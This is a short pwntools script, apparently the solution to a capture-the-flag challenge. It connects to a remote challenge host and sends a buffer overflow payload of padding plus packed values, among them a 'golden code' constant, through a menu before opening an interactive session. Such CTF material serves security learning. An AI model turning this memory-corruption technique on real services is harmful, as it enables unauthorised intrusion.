from pwn import *
io = remote("chal.thuctf.redbud.info", 34733)

GOLDEN_CODE = 0x52415453 

payload  = b"A" * 24
payload += b"A" * 16
payload += p32(1)
payload += p32(GOLDEN_CODE)

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"> ", payload)
io.sendlineafter(b"> ", b"4")

io.interactive()
